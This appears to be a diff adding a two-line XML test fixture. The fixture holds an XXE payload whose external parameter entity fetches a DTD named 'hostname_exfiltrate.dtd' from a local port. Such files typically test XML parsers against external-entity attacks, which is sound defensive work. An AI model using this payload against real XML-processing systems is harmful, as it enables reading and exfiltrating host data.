@@ -1,0 +1,2 @@
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:1337/hostname_exfiltrate.dtd"> %xxe;]>
+<foo></foo>
